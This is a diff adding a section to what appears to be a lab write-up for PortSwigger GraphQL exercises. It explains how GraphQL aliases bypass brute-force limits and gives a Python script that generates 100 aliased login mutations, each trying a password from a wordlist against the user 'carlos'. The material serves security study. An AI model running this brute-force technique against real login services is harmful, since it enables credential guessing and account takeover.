@@ -2347,6 +2347,34 @@ mutation {
 
 ----------------------
 
+### Bruteforcing with Graphql aliases to bypass bruteforce
+
+----------------------
+
+- Bruteforce limit mechanism can be bypassed by creating aliases to make multiple queries or mutation
+- In the case of this lab,I wrote a python script to generate 100 queries.
+
+```python3
+#! /usr/bin/env python3
+#Generating graphql mutation's aliases script for Portswigger
+
+passwords: list = open("passwords.txt","r").read().splitlines()
+queries = open("queries.txt","w")
+for num in range(0,100):
+    query: str = "    loginme: login(input: {\n        username: \"carlos\",\n        password: \"filter\"}) {\n        token,\n        success\n    }\n".replace("filter",passwords[num])
+    query = query.replace("loginme","login"+str(num))
+    queries.write(query)
+    print(query)
+
+queries.close()
+```
+
+- The script writes the result to a file named `queries.txt`
+
+![image](https://github.com/user-attachments/assets/95f7c9a3-bb4b-436e-b1e8-33e806d86d8d)
+
+- Result-:
+
 
 
 
